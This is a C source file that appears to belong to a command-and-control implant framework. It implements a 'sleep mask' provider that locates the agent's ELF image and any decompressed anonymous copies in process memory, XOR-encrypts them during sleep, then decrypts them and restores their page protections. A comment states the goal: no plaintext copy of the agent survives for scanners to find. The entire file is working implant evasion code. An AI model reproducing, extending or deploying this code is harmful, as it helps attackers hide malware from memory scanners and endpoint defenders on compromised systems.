/*
 * mask_xor.c — default sleep-mask provider: XOR the image in place.
 *
 * This code is part of the stager image, which is mapped separately from the
 * agent PIC. The agent calls it on its main thread after joining its workers,
 * so no thread can execute the image while it is being XORed. The function
 * makes the image writable, XORs every mapped PT_LOAD range with a random key,
 * sleeps, XORs the same bytes back, restores the original protections, and
 * returns to the (now unmasked) agent.
 */

#define _GNU_SOURCE
#include "mask.h"


#include "util/maps.h"
#include "util/strings.h"
#include "util/syscalls.h"
#include "util/utils.h"

#include <stdint.h>

#define MASK_KEY_LEN 32
#define MASK_MAX_MAPS 256
#define MASK_MAX_RANGES 32
#define MASK_MAX_PHNUM 1024
#define MASK_MAP_BUF (256u * 1024u)
#define MASK_O_RDONLY 0

#define MASK_ET_DYN 3
#define MASK_ET_EXEC 2
#define MASK_PT_LOAD 1

static uint16_t rd16(const uint8_t *p) {
  return (uint16_t)(p[0] | ((uint16_t)p[1] << 8));
}

static uint32_t rd32(const uint8_t *p) {
  return (uint32_t)p[0] | ((uint32_t)p[1] << 8) | ((uint32_t)p[2] << 16) |
         ((uint32_t)p[3] << 24);
}

static uint64_t rd64(const uint8_t *p) {
  return (uint64_t)rd32(p) | ((uint64_t)rd32(p + 4) << 32);
}

static int read_full(int fd, void *buf, size_t len) {
  size_t off = 0;
  while (off < len) {
    long n = read(fd, (uint8_t *)buf + off, len - off);
    if (n < 0) {
      if (n == -4) /* EINTR */
        continue;
      return -1;
    }
    if (n == 0)
      break;
    off += (size_t)n;
  }
  return (int)off;
}

struct mask_range {
  uintptr_t start;
  size_t len;
  int prot;
};

struct mask_elf {
  uintptr_t base;
  uintptr_t span;
  uintptr_t bias;
  int elf64;
  uint64_t phoff;
  uint16_t phentsize;
  uint16_t phnum;
  struct mask_range segs[MASK_MAX_RANGES];
  size_t nsegs;
};

/* Validate the ELF at `base` and collect its page-aligned PT_LOAD segments. */
static int elf_open(uintptr_t base, uintptr_t map_end, uintptr_t probe,
                    struct mask_elf *e) {
  const uint8_t *eh = (const uint8_t *)base;
  if (eh[0] != 0x7f || eh[1] != 'E' || eh[2] != 'L' || eh[3] != 'F')
    return 0;
  if (eh[4] != 1 && eh[4] != 2)
    return 0;
  if (eh[5] != 1) /* little-endian targets only */
    return 0;

  e->base = base;
  e->elf64 = eh[4] == 2;
  uint16_t type = rd16(eh + 16);
  if (type != MASK_ET_DYN && type != MASK_ET_EXEC)
    return 0;
  e->phoff = e->elf64 ? rd64(eh + 32) : rd32(eh + 28);
  e->phentsize = e->elf64 ? rd16(eh + 54) : rd16(eh + 42);
  e->phnum = e->elf64 ? rd16(eh + 56) : rd16(eh + 44);
  size_t min_ph = e->elf64 ? 56u : 32u;
  if (e->phentsize < min_ph || e->phnum == 0 || e->phnum > MASK_MAX_PHNUM)
    return 0;

  uint64_t phbytes = (uint64_t)e->phnum * e->phentsize;
  if (e->phoff > (uint64_t)UINTPTR_MAX || phbytes > (uint64_t)UINTPTR_MAX)
    return 0;
  uintptr_t phstart = base + (uintptr_t)e->phoff;
  if (phstart < base || phstart + (uintptr_t)phbytes < phstart ||
      phstart + (uintptr_t)phbytes > map_end)
    return 0;

  e->bias = type == MASK_ET_DYN ? base : 0;
  uintptr_t max_end = 0;
  int found = 0;
  e->nsegs = 0;
  for (uint16_t i = 0; i < e->phnum; i++) {
    const uint8_t *ph =
        (const uint8_t *)(phstart + (uintptr_t)i * e->phentsize);
    if (rd32(ph) != MASK_PT_LOAD)
      continue;
    uint64_t vaddr = e->elf64 ? rd64(ph + 16) : rd32(ph + 8);
    uint64_t memsz = e->elf64 ? rd64(ph + 40) : rd32(ph + 20);
    if (memsz == 0)
      continue;
    uintptr_t seg_start = (uintptr_t)(e->bias + vaddr);
    uintptr_t seg_end = seg_start + (uintptr_t)memsz;
    if (seg_end <= seg_start)
      return 0;
    if (probe >= seg_start && probe < seg_end)
      found = 1;
    if (seg_end > max_end)
      max_end = seg_end;
    if (e->nsegs < MASK_MAX_RANGES) {
      e->segs[e->nsegs].start = seg_start & ~(uintptr_t)(PAGE_SIZE - 1);
      e->segs[e->nsegs].len =
          ((seg_end + PAGE_SIZE - 1) & ~(uintptr_t)(PAGE_SIZE - 1)) -
          e->segs[e->nsegs].start;
      e->nsegs++;
    }
  }
  if (!found || max_end <= base)
    return 0;
  e->span = max_end - base;
  return 1;
}

/* Append the mappings that overlap the parsed image's PT_LOAD segments. */
static size_t add_image_ranges(const struct mask_elf *e,
                               const struct c2_map *maps, size_t nmaps,
                               struct mask_range *ranges, size_t cap,
                               size_t n) {
  for (size_t i = 0; i < nmaps && n < cap; i++) {
    if (maps[i].start < e->base || maps[i].start >= e->base + e->span)
      continue;
    int belongs = 0;
    for (size_t j = 0; j < e->nsegs; j++) {
      uintptr_t seg_end = e->segs[j].start + e->segs[j].len;
      if (maps[i].start < seg_end && e->segs[j].start < maps[i].end) {
        belongs = 1;
        break;
      }
    }
    if (!belongs)
      continue;
    int duplicate = 0;
    for (size_t j = 0; j < n; j++) {
      if (maps[i].start >= ranges[j].start &&
          maps[i].end <= ranges[j].start + ranges[j].len) {
        duplicate = 1;
        break;
      }
    }
    if (duplicate)
      continue;
    ranges[n].start = maps[i].start;
    ranges[n].len = (size_t)(maps[i].end - maps[i].start);
    ranges[n].prot = maps[i].prot;
    n++;
  }
  return n;
}

static int find_ranges(uintptr_t probe, struct mask_range *ranges, size_t cap) {
  int fd = open("/proc/self/maps", MASK_O_RDONLY, 0);
  if (fd < 0)
    return 0;
  char *text = (char *)mmap(NULL, MASK_MAP_BUF, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (text == MAP_FAILED) {
    close(fd);
    return 0;
  }
  int nread = read_full(fd, text, MASK_MAP_BUF - 1);
  close(fd);
  if (nread <= 0) {
    munmap(text, MASK_MAP_BUF);
    return 0;
  }
  text[nread] = '\0';

  struct c2_map maps[MASK_MAX_MAPS];
  size_t nmaps = 0;
  nmaps = c2_maps_parse(text, (size_t)nread, maps, MASK_MAX_MAPS);

  size_t probe_idx = nmaps;
  for (size_t i = 0; i < nmaps; i++) {
    if (probe >= maps[i].start && probe < maps[i].end) {
      probe_idx = i;
      break;
    }
  }
  size_t n = 0;
  if (probe_idx != nmaps) {
    struct mask_elf image;
    for (size_t i = probe_idx + 1; i-- > 0;) {
      if (!(maps[i].prot & PROT_READ) || maps[i].start > probe)
        continue;
      if (elf_open(maps[i].start, maps[i].end, probe, &image)) {
        n = add_image_ranges(&image, maps, nmaps, ranges, cap, n);
        break;
      }
    }
  }

  /* Malasada's stage0 can leave a decompressed copy of the agent SO in an
   * anonymous mapping separate from the segments it maps. Mask every anonymous
   * ELF image, not just the one containing the probe, so no plaintext copy of
   * the agent survives the sleep. */
  for (size_t i = 0; i < nmaps && n < cap; i++) {
    if (!maps[i].anonymous || !(maps[i].prot & PROT_READ) ||
        maps[i].end - maps[i].start < 4)
      continue;
    const uint8_t *m = (const uint8_t *)maps[i].start;
    if (m[0] != 0x7f || m[1] != 'E' || m[2] != 'L' || m[3] != 'F')
      continue;
    struct mask_elf image;
    if (elf_open(maps[i].start, maps[i].end, maps[i].start, &image))
      n = add_image_ranges(&image, maps, nmaps, ranges, cap, n);
  }

  munmap(text, MASK_MAP_BUF);
  return (int)n;
}

static int xor_ranges(const struct mask_range *ranges, size_t n,
                      const uint8_t *key) {
  for (size_t i = 0; i < n; i++) {
    volatile uint8_t *p = (volatile uint8_t *)ranges[i].start;
    for (size_t j = 0; j < ranges[i].len; j++)
      p[j] ^= key[j % MASK_KEY_LEN];
  }
  return 0;
}

int stager_mask_provider_sleep(unsigned seconds, uintptr_t probe) {
  struct mask_range ranges[MASK_MAX_RANGES];
  int n = find_ranges(probe, ranges, MASK_MAX_RANGES);
  if (n <= 0)
    return -1;

  int ok = 1;
  for (int i = 0; i < n; i++)
    if (mprotect((void *)ranges[i].start, ranges[i].len,
                 PROT_READ | PROT_WRITE) != 0) {
      ok = 0;
      goto restore;
    }

  uint8_t key[MASK_KEY_LEN];
  if (syscall3(SYS_getrandom, (long)key, MASK_KEY_LEN, 0) != MASK_KEY_LEN) {
    memset(key, 0, sizeof(key));
    for (size_t i = 0; i < sizeof(key); i++)
      key[i] = (uint8_t)(i * 131u + (unsigned)seconds);
  }

  xor_ranges(ranges, (size_t)n, key);

  struct timespec {
    long tv_sec;
    long tv_nsec;
  } ts;
  ts.tv_sec = (long)seconds;
  ts.tv_nsec = 0;
  long rc;
  do {
    rc = syscall2(SYS_nanosleep, (long)&ts, (long)&ts);
  } while (rc == -4);

  xor_ranges(ranges, (size_t)n, key);
  memset(key, 0, sizeof(key));

restore:
  for (int i = 0; i < n; i++)
    if (mprotect((void *)ranges[i].start, ranges[i].len, ranges[i].prot) != 0)
      ok = 0;
  return ok ? 0 : -1;
}
